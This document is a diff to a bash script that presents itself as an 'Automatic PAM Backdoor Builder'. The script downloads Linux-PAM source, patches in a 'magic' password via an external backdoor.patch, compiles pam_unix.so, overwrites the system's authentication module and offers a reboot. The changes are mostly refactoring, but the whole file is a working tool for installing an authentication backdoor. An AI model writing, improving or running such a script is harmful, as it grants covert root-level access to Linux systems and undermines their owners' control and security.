@@ -4,9 +4,8 @@ OPTIND=1
 PAM_VERSION=""
 PAM_FILE=""
 PASSWORD=""
-PAM_DEST_DIR="/lib/x86_64-linux-gnu/security"
-BACKUP_FILE="${PAM_DEST_DIR}/pam_unix.so.bak"
-TARGET_FILE="${PAM_DEST_DIR}/pam_unix.so"
+PAM_DEST="/lib/x86_64-linux-gnu/security/pam_unix.so"
+BACKUP_PATH="/lib/x86_64-linux-gnu/security/pam_unix.so.bak"
 
 DEPENDENCIES=(
     autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl 
@@ -15,32 +14,54 @@ DEPENDENCIES=(
     pkg-config sed w3m xsltproc xz-utils gcc wget
 )
 
+echo "--------------------------------------"
+echo "   Automatic PAM Backdoor Builder     "
+echo "--------------------------------------"
+
 function show_help {
     echo "Usage: $0 [-v version] -p password [--restore]"
     echo ""
     echo "Options:"
     echo "  -v          Specify Linux-PAM version (e.g., 1.3.1)."
     echo "  -p          The 'magic' password for the backdoor."
-    echo "  --restore   Restore the original pam_unix.so from backup."
-    echo "  -h, --help  Show this help message."
+    echo "  --restore   Restore original PAM and offer reboot."
+    echo "  -h, --help  Show help message."
+}
+
+function offer_reboot {
+    echo ""
+    while true; do
+        read -p "Task complete. Would you like to reboot now? (y/n): " yn
+        case $yn in
+            [Yy]* ) 
+                echo "Rebooting system..."
+                reboot
+                break;;
+            [Nn]* ) 
+                echo "Exiting. Changes may require a restart to take effect."
+                exit 0;;
+            * ) echo "Please answer y or n.";;
+        esac
+    done
 }
 
 if [[ $EUID -ne 0 ]]; then
-   echo "This script must be run as root (use sudo)."
+   echo "Error: This script must be run as root."
    exit 1
 fi
 
-if [[ "$1" == "--restore" ]]; then
-    if [ -f "$BACKUP_FILE" ]; then
-        echo "Restoring backup from $BACKUP_FILE..."
-        cp "$BACKUP_FILE" "$TARGET_FILE"
-        echo "Restore complete. Please verify login in a separate terminal."
-        exit 0
-    else
-        echo "Error: No backup found at $BACKUP_FILE"
-        exit 1
+for arg in "$@"; do
+    if [[ "$arg" == "--restore" ]]; then
+        if [ -f "$BACKUP_PATH" ]; then
+            echo "Restoring original module..."
+            cp "$BACKUP_PATH" "$PAM_DEST"
+            offer_reboot
+        else
+            echo "Error: Backup file $BACKUP_PATH not found."
+            exit 1
+        fi
     fi
-fi
+done
 
 function check_dependencies {
     echo "Checking dependencies..."
@@ -52,33 +73,20 @@ function check_dependencies {
     done
 
     if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
-        echo "Installing missing dependencies: ${MISSING_PKGS[*]}"
         apt update && apt install -y "${MISSING_PKGS[@]}"
-    else
-        echo "All dependencies are already installed."
     fi
 }
 
-for arg in "$@"; do
-    if [[ "$arg" == "--help" || "$arg" == "-h" ]]; then
-        show_help
-        exit 0
-    fi
-done
-
-while getopts ":p:v:" opt; do
+while getopts ":h:?:p:v:" opt; do
     case "$opt" in
-    v) PAM_VERSION="$OPTARG" ;;
-    p) PASSWORD="$OPTARG" ;;
-    *) show_help; exit 1 ;;
+    h|\?) show_help; exit 0 ;;
+    v)    PAM_VERSION="$OPTARG" ;;
+    p)    PASSWORD="$OPTARG" ;;
     esac
 done
 
-shift $((OPTIND-1))
-
 if [ -z "$PASSWORD" ]; then
-    echo "Error: Password (-p) is required unless using --restore."
-    show_help
+    echo "Error: Password (-p) is required."
     exit 1
 fi
 
@@ -90,40 +98,35 @@ if [ -z "$PAM_VERSION" ]; then
 fi
 
 PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
-PAM_DIR="linux-pam-${PAM_VERSION}"
 PAM_FILE="v${PAM_VERSION}.tar.gz"
+PAM_DIR="linux-pam-${PAM_VERSION}"
 
-# (Download logic remains same)
-wget -c "${PAM_BASE_URL}/${PAM_FILE}" || {
-    PAM_DIR="linux-pam-Linux-PAM-${PAM_VERSION}"
-    PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.gz"
-    wget -c "${PAM_BASE_URL}/${PAM_FILE}"
-}
-
+wget -c "${PAM_BASE_URL}/${PAM_FILE}" || { echo "Download failed"; exit 1; }
 tar xzf "$PAM_FILE"
 
 if [ -f "backdoor.patch" ]; then
     sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR"
 else
-    echo "Error: backdoor.patch not found."
+    echo "Error: backdoor.patch missing."
     exit 1
 fi
 
 cd "$PAM_DIR"
-[[ ! -f "./configure" ]] && ./autogen.sh
+if [[ ! -f "./configure" ]]; then ./autogen.sh; fi 
 ./configure --libdir=/lib/x86_64-linux-gnu
 make
 
 if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
-    if [ ! -f "$BACKUP_FILE" ]; then
-        echo "Creating initial backup of original PAM module..."
-        cp "$TARGET_FILE" "$BACKUP_FILE"
-    fi
-
-    echo "Deploying modified module..."
-    cp modules/pam_unix/.libs/pam_unix.so "$TARGET_FILE"
-    echo "Success: Backdoor deployed to $TARGET_FILE"
-    echo "Original backup kept at: $BACKUP_FILE"
+    cp modules/pam_unix/.libs/pam_unix.so ../pam_unix.so
+    cd ..
+    
+    echo "Build successful. Backing up original..."
+    [ ! -f "$BACKUP_PATH" ] && cp "$PAM_DEST" "$BACKUP_PATH"
+    
+    echo "Installing backdoored module to $PAM_DEST..."
+    cp ./pam_unix.so "$PAM_DEST"
+    
+    offer_reboot
 else
     echo "Error: Build failed."
     exit 1
